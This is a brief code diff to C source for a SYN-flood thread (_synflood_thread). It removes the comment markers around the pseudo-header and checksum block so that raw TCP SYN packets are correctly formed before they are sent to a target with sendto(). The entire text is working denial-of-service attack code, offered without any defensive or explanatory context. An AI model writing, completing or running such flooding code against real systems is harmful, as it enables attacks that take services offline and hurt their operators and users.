@@ -165,7 +165,6 @@ void *_synflood_thread(void *arg)
         pseudo_header.saddr = ip_header->ip_src.s_addr;
 
         // Calculate checksums
-        /*
         memcpy(send_buffer, &pseudo_header, sizeof (struct PSD_HEADER));
         memcpy(send_buffer + sizeof (struct PSD_HEADER), &tcp_header,
                sizeof (struct tcphdr));
@@ -178,7 +177,6 @@ void *_synflood_thread(void *arg)
         ip_header->ip_sum = checksum(send_buffer, sizeof (struct ip) +
                                    sizeof (struct tcphdr));
         memcpy(send_buffer, &ip_header, sizeof (struct ip));
-        */
 
         int bytes = sendto(sockfd, send_buffer, sizeof (struct ip) +
                sizeof (struct tcphdr), 0, (struct sockaddr *) &target_addr,
